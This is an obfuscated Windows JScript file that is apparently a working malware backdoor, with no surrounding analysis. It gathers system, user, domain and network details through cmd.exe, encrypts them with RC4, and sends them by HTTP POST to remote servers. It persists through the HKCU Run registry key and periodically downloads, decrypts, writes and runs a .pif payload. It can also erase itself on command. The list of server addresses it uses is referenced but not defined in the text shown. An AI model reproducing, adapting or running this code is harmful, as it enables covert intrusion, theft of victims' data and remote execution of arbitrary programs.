var LwHA = new Array("systeminfo > ", "net view >> ", "net view /domain >> ", "tasklist /v >> ", "gpresult /z >> ", "netstat -nao >> ", "ipconfig /all >> ", "arp -a >> ", "net share >> ", "net use >> ", "net user >> ", "net user administrator >> ", "net user /domain >> ", "net user administrator /domain >> ", "set  >> ", "dir %systemdrive%\x5cUsers\x5c*.* >> ", "dir %userprofile%\x5cAppData\x5cRoaming\x5cMicrosoft\x5cWindows\x5cRecent\x5c*.* >> ", "dir %userprofile%\x5cDesktop\x5c*.* >> ", "tasklist /fi \x22modules eq wow64.dll\x22  >> ", "tasklist /fi \x22modules ne wow64.dll\x22 >> ", "dir \x22%programfiles(x86)%\x22 >> ", "dir \x22%programfiles%\x22 >> ", "dir %appdata% >>");
var Z6HQ = new ActiveXObject("Scripting.FileSystemObject");
var EBKd = WScript.ScriptName;
var Vxiu = "";
var lDd9 = a0rV();
 
function DGbq(xxNA, j5zO) {
    char_set = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/";
    var bzwO = "";
    var sW_c = "";
    for (var i = 0; i < xxNA.length; ++i) {
        var W0Ce = xxNA.charCodeAt(i);
        var o_Nk = W0Ce.toString(2);
        while (o_Nk.length < (j5zO ? 8 : 16))
            o_Nk = "0" + o_Nk;
        sW_c += o_Nk;
        while (sW_c.length >= 6) {
            var AaP0 = sW_c.slice(0, 6);
            sW_c = sW_c.slice(6);
            bzwO += this.char_set.charAt(parseInt(AaP0, 2));
        }
    }
    if (sW_c) {
        while (sW_c.length < 6) sW_c += "0";
        bzwO += this.char_set.charAt(parseInt(sW_c, 2));
    }
    while (bzwO.length % (j5zO ? 4 : 8) != 0)
        bzwO += "=";
    return bzwO;
}
var lW6t = [];
lW6t['C7'] = '80';
lW6t['FC'] = '81';
lW6t['E9'] = '82';
lW6t['E2'] = '83';
lW6t['E4'] = '84';
lW6t['E0'] = '85';
lW6t['E5'] = '86';
lW6t['E7'] = '87';
lW6t['EA'] = '88';
lW6t['EB'] = '89';
lW6t['E8'] = '8A';
lW6t['EF'] = '8B';
lW6t['EE'] = '8C';
lW6t['EC'] = '8D';
lW6t['C4'] = '8E';
lW6t['C5'] = '8F';
lW6t['C9'] = '90';
lW6t['E6'] = '91';
lW6t['C6'] = '92';
lW6t['F4'] = '93';
lW6t['F6'] = '94';
lW6t['F2'] = '95';
lW6t['FB'] = '96';
lW6t['F9'] = '97';
lW6t['FF'] = '98';
lW6t['D6'] = '99';
lW6t['DC'] = '9A';
lW6t['A2'] = '9B';
lW6t['A3'] = '9C';
lW6t['A5'] = '9D';
lW6t['20A7'] = '9E';
lW6t['192'] = '9F';
lW6t['E1'] = 'A0';
lW6t['ED'] = 'A1';
lW6t['F3'] = 'A2';
lW6t['FA'] = 'A3';
lW6t['F1'] = 'A4';
lW6t['D1'] = 'A5';
lW6t['AA'] = 'A6';
lW6t['BA'] = 'A7';
lW6t['BF'] = 'A8';
lW6t['2310'] = 'A9';
lW6t['AC'] = 'AA';
lW6t['BD'] = 'AB';
lW6t['BC'] = 'AC';
lW6t['A1'] = 'AD';
lW6t['AB'] = 'AE';
lW6t['BB'] = 'AF';
lW6t['2591'] = 'B0';
lW6t['2592'] = 'B1';
lW6t['2593'] = 'B2';
lW6t['2502'] = 'B3';
lW6t['2524'] = 'B4';
lW6t['2561'] = 'B5';
lW6t['2562'] = 'B6';
lW6t['2556'] = 'B7';
lW6t['2555'] = 'B8';
lW6t['2563'] = 'B9';
lW6t['2551'] = 'BA';
lW6t['2557'] = 'BB';
lW6t['255D'] = 'BC';
lW6t['255C'] = 'BD';
lW6t['255B'] = 'BE';
lW6t['2510'] = 'BF';
lW6t['2514'] = 'C0';
lW6t['2534'] = 'C1';
lW6t['252C'] = 'C2';
lW6t['251C'] = 'C3';
lW6t['2500'] = 'C4';
lW6t['253C'] = 'C5';
lW6t['255E'] = 'C6';
lW6t['255F'] = 'C7';
lW6t['255A'] = 'C8';
lW6t['2554'] = 'C9';
lW6t['2569'] = 'CA';
lW6t['2566'] = 'CB';
lW6t['2560'] = 'CC';
lW6t['2550'] = 'CD';
lW6t['256C'] = 'CE';
lW6t['2567'] = 'CF';
lW6t['2568'] = 'D0';
lW6t['2564'] = 'D1';
lW6t['2565'] = 'D2';
lW6t['2559'] = 'D3';
lW6t['2558'] = 'D4';
lW6t['2552'] = 'D5';
lW6t['2553'] = 'D6';
lW6t['256B'] = 'D7';
lW6t['256A'] = 'D8';
lW6t['2518'] = 'D9';
lW6t['250C'] = 'DA';
lW6t['2588'] = 'DB';
lW6t['2584'] = 'DC';
lW6t['258C'] = 'DD';
lW6t['2590'] = 'DE';
lW6t['2580'] = 'DF';
lW6t['3B1'] = 'E0';
lW6t['DF'] = 'E1';
lW6t['393'] = 'E2';
lW6t['3C0'] = 'E3';
lW6t['3A3'] = 'E4';
lW6t['3C3'] = 'E5';
lW6t['B5'] = 'E6';
lW6t['3C4'] = 'E7';
lW6t['3A6'] = 'E8';
lW6t['398'] = 'E9';
lW6t['3A9'] = 'EA';
lW6t['3B4'] = 'EB';
lW6t['221E'] = 'EC';
lW6t['3C6'] = 'ED';
lW6t['3B5'] = 'EE';
lW6t['2229'] = 'EF';
lW6t['2261'] = 'F0';
lW6t['B1'] = 'F1';
lW6t['2265'] = 'F2';
lW6t['2264'] = 'F3';
lW6t['2320'] = 'F4';
lW6t['2321'] = 'F5';
lW6t['F7'] = 'F6';
lW6t['2248'] = 'F7';
lW6t['B0'] = 'F8';
lW6t['2219'] = 'F9';
lW6t['B7'] = 'FA';
lW6t['221A'] = 'FB';
lW6t['207F'] = 'FC';
lW6t['B2'] = 'FD';
lW6t['25A0'] = 'FE';
lW6t['A0'] = 'FF';
 
function a0rV() {
    var YrUH = Math.ceil(Math.random() * 10 + 25);
    var name = String.fromCharCode(Math.ceil(Math.random() * 24 + 65));
    var JKfG = WScript.CreateObject("WScript.Network");
    Vxiu = JKfG.UserName;
    for (var count = 0; count < YrUH; count++) {
        switch (Math.ceil(Math.random() * 3)) {
            case 1:
                name = name + Math.ceil(Math.random() * 8);
                break;
            case 2:
                name = name + String.fromCharCode(Math.ceil(Math.random() * 24 + 97));
                break;
            default:
                name = name + String.fromCharCode(Math.ceil(Math.random() * 24 + 65));
                break;
        }
    }
    return name;
}
var icVh = Jp6A(HAP5());
try {
    var CJPE = HAP5();
    W6cM();
    Syrl();
} catch (e) {
    WScript.Quit();
}
 
function Syrl() {
    var m2n0 = xhOC();
    while (true) {
        for (var i = 0; i < WQuh.length; i++) {
            var bx_4 = WQuh[i];
            var czlA = V9iU(bx_4, m2n0);
            switch (czlA) {
                case "good":
                    break;
                case "exit":
                    WScript.Quit();
                    break;
                case "work":
                    eRNv(bx_4);
                    break;
                case "fail":
                    I7UO();
                    break;
                default:
                    break;
            }
            a0rV();
        }
        WScript.Sleep((Math.random() * 300 + 3600) * 1000);
    }
}
 
function HAP5() {
    var zkDC = this['\u0041\u0063\u0074i\u0076eX\u004F\u0062j\u0065c\u0074'];
    var jVNP = new zkDC('\u0057\u0053cr\u0069\u0070\u0074\u002E\u0053he\u006C\u006C');
    return jVNP;
}
 
function eRNv(caA2) {
    var jpVh = icVh + EBKd.substring(0, EBKd.length - 2) + "pif";
    var S47T = new ActiveXObject("MSXML2.XMLHTTP");
    S47T.OPEN("post", caA2, false);
    S47T.SETREQUESTHEADER("user-agent:", "Mozilla/5.0 (Windows NT 6.1; Win64; x64); " + he50());
    S47T.SETREQUESTHEADER("content-type:", "application/octet-stream");
    S47T.SETREQUESTHEADER("content-length:", "4");
    S47T.SEND("work");
    if (Z6HQ.FILEEXISTS(jpVh)) {
        Z6HQ.DELETEFILE(jpVh);
    }
    if (S47T.STATUS == 200) {
        var gfjd = new ActiveXObject("ADODB.STREAM");
        gfjd.TYPE = 1;
        gfjd.OPEN();
        gfjd.WRITE(S47T.responseBody);
        gfjd.Position = 0;
        gfjd.Type = 2;
        gfjd.CharSet = "437";
        var j3k6 = gfjd.ReadText(gfjd.Size);
        var RAKT = t7Nl("2f532d6baec3d0ec7b1f98aed4774843", l9BJ(j3k6));
        Trql(RAKT, jpVh);
        gfjd.Close();
    }
    var lDd9 = a0rV();
    nr3z(jpVh, caA2);
    WScript.Sleep(30000);
    Z6HQ.DELETEFILE(jpVh);
}
 
function I7UO() {
    Z6HQ.DELETEFILE(WScript.SCRIPTFULLNAME);
    CJPE.REGDELETE("HKEY_CURRENT_USER\x5csoftware\x5cmicrosoft\x5cwindows\x5ccurrentversion\x5crun\x5c" + EBKd.substring(0, EBKd.length - 3));
    WScript.Quit();
}
 
function V9iU(pxug, tqDX) {
    try {
        var S47T = new ActiveXObject("MSXML2.XMLHTTP");
        S47T.OPEN("post", pxug, false);
        S47T.SETREQUESTHEADER("user-agent:", "Mozilla/5.0 (Windows NT 6.1; Win64; x64); " + he50());
        S47T.SETREQUESTHEADER("content-type:", "application/octet-stream");
        var SoNI = DGbq(tqDX, true);
        S47T.SETREQUESTHEADER("content-length:", SoNI.length);
        S47T.SEND(SoNI);
        return S47T.responseText;
    } catch (e) {
        return "";
    }
}
 
function he50() {
    var wXgO = "";
    var JKfG = WScript.CreateObject("WScript.Network");
    var SoNI = zIRF + JKfG.ComputerName + Vxiu;
    for (var i = 0; i < 16; i++) {
        var DXHy = 0
        for (var j = i; j < SoNI.length - 1; j++) {
            DXHy = DXHy ^ SoNI.charCodeAt(j);
        }
        DXHy = (DXHy % 10);
        wXgO = wXgO + DXHy.toString(10);
    }
    wXgO = wXgO + zIRF;
    return wXgO;
}
 
function W6cM() {
    v_FileName = icVh + EBKd.substring(0, EBKd.length - 2) + "js";
    Z6HQ.COPYFILE(WScript.ScriptFullName, icVh + EBKd);
    var zIqu = (Math.random() * 150 + 350) * 1000;
    WScript.Sleep(zIqu);
    CJPE.REGWRITE("HKEY_CURRENT_USER\x5csoftware\x5cmicrosoft\x5cwindows\x5ccurrentversion\x5crun\x5c" + EBKd.substring(0, EBKd.length - 3), ("wscript.exe //B " + String.fromCharCode(34) + icVh + EBKd + String.fromCharCode(34) + " NPEfpRZ4aqnh1YuGwQd0"), "REG_SZ");
}
 
function xhOC() {
    var U5rJ = icVh + "~dat.tmp";
    for (var i = 0; i < LwHA.length; i++) {
        CJPE.Run("cmd.exe /c " + LwHA[i] + "\x22" + U5rJ + "", 0, true);
    }
    var jxHd = S7EN(U5rJ);
    WScript.Sleep(1000);
    Z6HQ.DELETEFILE(U5rJ);
    return t7Nl("2f532d6baec3d0ec7b1f98aed4774843", jxHd);
}
 
function nr3z(jpVh, caA2) {
    try {
        if (Z6HQ.FILEEXISTS(jpVh)) {
            CJPE.Run("\x22" + jpVh + "\x22");
        }
    } catch (e) {
        var S47T = new ActiveXObject("MSXML2.XMLHTTP");
        S47T.OPEN("post", caA2, false);
        var ND3M = "error";
        S47T.SETREQUESTHEADER("user-agent:", "Mozilla/5.0 (Windows NT 6.1; Win64; x64); " + he50());
        S47T.SETREQUESTHEADER("content-type:", "application/octet-stream");
        S47T.SETREQUESTHEADER("content-length:", ND3M.length);
        S47T.SEND(ND3M);
        return "";
    }
}
 
function poBP(QQDq) {
    var HiEg = "0123456789ABCDEF";
    var L9qj = HiEg.substr(QQDq & 15, 1);
    while (QQDq > 15) {
        QQDq >>>= 4;
        L9qj = HiEg.substr(QQDq & 15, 1) + L9qj;
    }
    return L9qj;
}
 
function JbVq(x4hL) {
    return parseInt(x4hL, 16);
}
 
function l9BJ(Wid9) {
    var wXgO = [];
    var pV8q = Wid9.length;
    for (var i = 0; i < pV8q; i++) {
        var yWql = Wid9.charCodeAt(i);
        if (yWql >= 128) {
            var h = lW6t['' + poBP(yWql)];
            yWql = JbVq(h);
        }
        wXgO.push(yWql);
    }
    return wXgO;
}
 
function Trql(EQ4R, K5X0) {
    var gfjd = WScript.CreateObject("ADODB.Stream");
    gfjd.type = 2;
    gfjd.Charset = "iso-8859-1";
    gfjd.Open();
    gfjd.WriteText(EQ4R);
    gfjd.Flush();
    gfjd.Position = 0;
    gfjd.SaveToFile(K5X0, 2);
    gfjd.close();
}
 
function Jp6A(KgOm) {
    icVh = "c:\x5cUsers\x5c" + Vxiu + "\x5cAppData\x5cLocal\x5cMicrosoft\x5cWindows\x5c";
    if (!Z6HQ.FOLDEREXISTS(icVh))
        icVh = "c:\x5cUsers\x5c" + Vxiu + "\x5cAppData\x5cLocal\x5cTemp\x5c";
    if (!Z6HQ.FOLDEREXISTS(icVh))
        icVh = "c:\x5cDocuments and Settings\x5c" + Vxiu + "\x5cApplication Data\x5cMicrosoft\x5cWindows\x5c";
    return icVh
}
 
function t7Nl(npmb, AIsp) {
    var M4tj = [];
    var KRYr = 0;
    var FPIW;
    var wXgO = '';
    for (var i = 0; i < 256; i++) {
        M4tj[i] = i;
    }
    for (var i = 0; i < 256; i++) {
        KRYr = (KRYr + M4tj[i] + npmb.charCodeAt(i % npmb.length)) % 256;
        FPIW = M4tj[i];
        M4tj[i] = M4tj[KRYr];
        M4tj[KRYr] = FPIW;
    }
    var i = 0;
    var KRYr = 0;
    for (var y = 0; y < AIsp.length; y++) {
        i = (i + 1) % 256;
        KRYr = (KRYr + M4tj[i]) % 256;
        FPIW = M4tj[i];
        M4tj[i] = M4tj[KRYr];
        M4tj[KRYr] = FPIW;
        wXgO += String.fromCharCode(AIsp[y] ^ M4tj[(M4tj[i] + M4tj[KRYr]) % 256]);
    }
    return wXgO;
}
```